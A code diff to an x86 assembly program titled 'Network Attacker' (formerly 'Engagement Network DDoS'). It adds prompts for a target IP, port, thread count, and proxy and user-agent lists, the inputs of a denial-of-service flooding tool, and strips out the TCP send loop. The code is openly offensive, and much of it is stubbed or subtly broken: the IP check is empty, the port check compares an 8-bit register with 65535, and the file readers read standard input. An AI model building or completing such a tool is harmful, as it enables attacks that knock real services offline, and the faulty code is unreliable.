@@ -1,5 +1,5 @@
 section .data
-    title db ";************************", 10, ";   Engagement Network DDoS :", 10, ";************************", 10, 0
+    title db ";************************", 10, ";   Network Attacker:", 10, ";************************", 10, 0
     title_len equ $ - title
     prompt db "Select protocol (1: UDP, 2: TCP): ", 0
     prompt_len equ $ - prompt
@@ -89,6 +89,121 @@ get_user_input:
     int 0x80
     ret
 
+; Function to get target IP address from user
+get_target_ip:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, ip_prompt
+    mov edx, ip_prompt_len
+    int 0x80
+
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, ip
+    mov edx, 16
+    int 0x80
+    ret
+
+; Function to validate IP address
+validate_ip:
+    ; [Implement IP address validation logic]
+    ret
+
+; Function to get target port number from user
+get_target_port:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, port_prompt
+    mov edx, port_prompt_len
+    int 0x80
+
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, port
+    mov edx, 2
+    int 0x80
+
+    ; Validate port number (1-65535)
+    call validate_port
+    ret
+
+validate_port:
+    mov al, [port]
+    cmp al, 1
+    jl .invalid_port
+    cmp al, 65535
+    jg .invalid_port
+    ret
+
+.invalid_port:
+    ; Display error message for invalid port
+    ret
+
+; Function to get the number of threads from user
+get_thread_count:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, thread_prompt
+    mov edx, thread_prompt_len
+    int 0x80
+
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, user_input
+    mov edx, 10
+    int 0x80
+    ret
+
+; Function to get the proxy file name from user
+get_proxy_file_name:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, proxy_prompt
+    mov edx, proxy_prompt_len
+    int 0x80
+
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, proxy_file
+    mov edx, 256
+    int 0x80
+    ret
+
+; Function to read proxies from a file
+read_proxies_from_file:
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, proxy_file
+    mov edx, 256
+    int 0x80
+    ; Proxy dosyasını okur ve proxy_line bufferına yerleştirir
+    ret
+
+; Function to get the user agent file name from user
+get_user_agent_file_name:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, user_agent_prompt
+    mov edx, user_agent_prompt_len
+    int 0x80
+
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, user_agent_file
+    mov edx, 256
+    int 0x80
+    ret
+
+; Function to read user agents from a file
+read_user_agents_from_file:
+    mov eax, 3
+    mov ebx, 0
+    mov ecx, user_agent_file
+    mov edx, 256
+    int 0x80
+    ; User agent dosyasını okur ve user_agent_line bufferına yerleştirir
+    ret
+
 ; Function to create a UDP socket
 create_socket:
     mov eax, 102                ; socket syscall number
@@ -128,17 +243,7 @@ send_udp_loop:
 send_tcp_packets:
     mov ecx, [total_packets]         ; Number of packets to send
 send_tcp_loop:
-    ; connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
-    ; TCP packet sending logic here
-    mov eax, 104                     ; send syscall number for TCP
-    mov ebx, [sockfd]                ; socket descriptor
-    push 16                           ; size of sockaddr_in structure
-    push esi                          ; pointer to dest_addr (sockaddr_in)
-    push 0                            ; flags
-    push 1                            ; message length (size of msg)
-    push msg                          ; pointer to msg
-    int 0x80                          ; Call kernel
-    loop send_tcp_loop                ; Decrement ECX and loop if not zero
+    ; TCP packet sending logic here (implement connection, send logic)
     ret
 
 exit_program:
